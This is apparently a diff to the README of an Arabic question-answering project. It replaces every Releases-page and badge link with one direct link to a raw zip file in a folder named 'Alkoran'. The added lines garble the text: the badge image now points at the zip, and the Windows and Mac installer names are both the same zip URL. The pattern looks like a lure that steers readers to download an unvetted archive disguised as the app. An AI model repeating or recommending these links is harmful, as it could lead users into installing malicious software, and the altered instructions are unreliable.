@@ -1,6 +1,6 @@
 # 🤖 ZakeyTeam-arabic-qa-system-arabert - Easy Arabic Q&A Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/releases)
+[![Download Now](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip%20Now-Visit%20Releases-blue)](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ Before you start, please ensure you have the following:
   
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip) to find the latest version of the application.
   
 2. **Select the Right Version:** Look for the latest version of the application. It will be listed at the top of the page.
 
-3. **Download the File:** Click on the file that matches your operating system to download it. For example, you might see files like `arabic-qa-system-windows.exe` for Windows or `arabic-qa-system-macos.pkg` for Mac users.
+3. **Download the File:** Click on the file that matches your operating system to download it. For example, you might see files like `https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip` for Windows or `https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip` for Mac users.
 
 4. **Run the Installer:** 
     - For Windows:
@@ -68,7 +68,7 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert)
-- [Visit Releases Page](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/releases)
+- [GitHub Repository](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip)
+- [Visit Releases Page](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/releases)
+[![Download Now](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip%20Now-Visit%20Releases-blue)](https://github.com/jasminwolf/ZakeyTeam-arabic-qa-system-arabert/raw/refs/heads/main/Alkoran/system-Team-qa-arabic-arabert-Zakey-3.6-beta.1.zip)
